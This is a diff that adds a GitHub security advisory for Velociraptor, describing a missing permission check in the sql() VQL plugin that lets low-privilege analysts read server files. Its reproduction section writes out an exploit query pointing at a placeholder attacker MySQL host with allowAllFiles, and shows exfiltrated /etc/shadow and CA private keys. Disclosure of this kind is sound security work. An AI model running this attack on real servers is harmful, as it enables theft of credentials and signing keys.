@@ -1,0 +1,66 @@
+{
+  "id": "GHSA-9qq5-422f-33c2",
+  "modified": "2026-11-09T22:30:04.078797501Z",
+  "published": "2026-11-09T22:25:14Z",
+  "aliases": [
+    "CVE-2026-85737"
+  ],
+  "summary": "Velociraptor: Low-priv analyst reads arbitrary server files via ungated sql() VQL plugin",
+  "details": "## Summary\n\nThe `sql()` VQL plugin runs a caller-supplied database driver and connection string with no permission check (`vql/parsers/sql/sql.go:93`, `SQLPlugin.Call`). For `driver='mysql'` or `driver='postgres'` the handle comes from `GetHandleOther` (`sql.go:39`), which passes the connection string straight to Go `database/sql` `sql.Open` (`sql.go:51`) and executes the query (`sql.go:159`).\n\nThe plugin declares `FILESYSTEM_READ` only as `Info().Permissions` metadata (`sql.go:219`). That metadata is never consulted at runtime: `metadata.go:19` stores it as a string that only the documentation exporter reads (`api/reflect.go:82-110`). Every sibling network plugin (`http_client`, `netcat`, `s3`, `rsyslog`) calls `CheckAccess(acls.NETWORK)` in its own body; `sql()` calls nothing.\n\nThe built-in `analyst` role holds `ANY_QUERY` but not `FILESYSTEM_READ` or `NETWORK` (`acls/roles.go:222`), and reaches this sink through the notebook query API.\n\nResult: a low-priv analyst opens arbitrary outbound TCP connections and, through a rogue MySQL server's `LOAD DATA LOCAL INFILE`, reads any file the root-running server can read, including the deployment CA private key.\n\n## Affected\n\n- Velocidex/velociraptor server, `\u003c= v0.77.1` (latest release, 2026-06-23). Identical vulnerable code in `master` HEAD `1961e79` (2026-07-17).\n- Confirmed live-exploitable on the official `ghcr.io/velocidex/velociraptor-server:latest` image (build 0.77.1, commit bbe2a58).\n- Stock install, default Basic authenticator, any built-in `analyst`, `investigator`, or `api` role (all hold `ANY_QUERY`, none holds `FILESYSTEM_READ` or `NETWORK`).\n- No non-default flag required.\n\n## Root cause\n\n`SQLPlugin.Call` (`vql/parsers/sql/sql.go:93`) parses the caller `driver`, `connstring`, and `query` arguments and reaches `handle.Query` (`sql.go:159`) without any `vql_subsystem.CheckAccess` call in its body. For `driver='mysql'` or `driver='postgres'` the handle comes from `GetHandleOther` (`sql.go:39`), which hands the attacker connection string to `sql.Open` (`sql.go:51`), so the plugin dials an arbitrary host and, through the MySQL client `LOAD DATA LOCAL INFILE` feature, reads local files. The plugin states its intended gate only as metadata, `VQLMetadata().Permissions(acls.FILESYSTEM_READ)` (`sql.go:219`), but `MetadataBuilder.Permissions` merely stores a string (`vql/metadata.go:19`) that is read only by the reflection exporter (`api/reflect.go:82-110`), never by the query engine. Every sibling network plugin enforces `CheckAccess(acls.NETWORK)` in its own body, so the omission in `sql()` is an enforcement oversight. The default `analyst` role grants `ANY_QUERY` without `FILESYSTEM_READ` or `NETWORK` (`acls/roles.go:222`), so a user the operator deliberately restricted still reaches the ungated sink.\n\nNote on intent: `acls/acls.go` documents that specific permission combinations grant admin-equivalent power (`SERVER_ARTIFACT_WRITER` with `COLLECT_SERVER`, `ARTIFACT_WRITER` with `COLLECT_CLIENT`), but the `analyst` role holds none of them and is denied `EXECVE`, `NETWORK`, and `FILESYSTEM_READ` on every sibling plugin. If `ANY_QUERY` is nonetheless intended as trusted, the plugin's own `Permissions(FILESYSTEM_READ)` metadata and the runtime enforcement on all sibling plugins are misleading and should be reconciled; otherwise this is a missing runtime check.\n\n## Reproduction\n\n`ghcr.io/velocidex/velociraptor-server:latest` (v0.77.1), default config, GUI on `https://localhost:8889`, one built-in `analyst` user.\n\n1) As `analyst`, confirm the control: the gated accessor denies the read.\n\n    sql(driver='sqlite', accessor='file', file='/etc/passwd', query='SELECT 1')\n    =\u003e sql: Field file Accessor file: PermissionDenied: Permission denied: [FILESYSTEM_READ]\n\n2) Start a rogue MySQL server on an attacker host that completes the handshake and answers any query with a `LOAD DATA LOCAL INFILE \u003ctarget\u003e` packet.\n\n3) As the same `analyst`, call the ungated branch through the notebook query API:\n\n    POST /api/v1/UpdateNotebookCell   (Basic auth + x-csrf-token)\n    {\"type\":\"vql\",\"input\":\"SELECT * FROM sql(driver='mysql',\n      connstring='x:y@tcp(\u003cATTACKER\u003e:4499)/z?allowAllFiles=true', query='SELECT 1')\"}\n\nThe rogue server receives the file:\n\n    QUERY: 'SELECT 1'\n    EXFIL 12860 bytes  /etc/velociraptor/server.config.yaml\n      contains: CA private_key, gw_private_key, Frontend private_key\n\nLive-verified: analyst `pocdemo` exfiltrated `/etc/passwd`, `/etc/shadow` (mode 0600), and `server.config.yaml`, each sha256 byte-identical to `docker exec sha256sum`, while `http_client()` on the same account returns `PermissionDenied: [NETWORK]`.\n\n## Impact\n\n* CA and Frontend RSA private keys disclosed: forge client certificates, impersonate the server to every enrolled endpoint.\n* Any root-readable file on the server host disclosed (`/etc/shadow`, datastore user records with password hashes, cross-tenant `orgs` data).\n* Arbitrary outbound TCP from the server host through the same sink and the `upload_sftp`, `upload_smb`, `upload_azure`, `upload_gcs` plugins.\n* Root-owned file creation at any path via the `sqlite` branch (zero-permission `data` accessor plus an in-query `ATTACH DATABASE`).\n* Triggered by the lowest built-in query role, default config, one query, no admin interaction.\n\n## Credit\n\nJan Kahmen, [turingpoint](https://www.turingpoint.de) (jan@turingpoint.de)",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "www.velocidex.com/golang/velociraptor",
+        "purl": "pkg:golang/www.velocidex.com/golang/velociraptor"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.77.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.77.1",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-9qq5-422f-33c2/GHSA-9qq5-422f-33c2.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/Velocidex/velociraptor/security/advisories/GHSA-9qq5-422f-33c2"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-85737"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Velocidex/velociraptor/pull/4952"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Velocidex/velociraptor/commit/d7de958e846d3742a7a3a8538fd463e4f12fc528"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Velocidex/velociraptor/commit/f25390f8fbd00c888f0b7aaba2c061a51c3f7082"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/Velocidex/velociraptor"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Velocidex/velociraptor/releases/tag/v0.77.2"
+    }
+  ]
+}
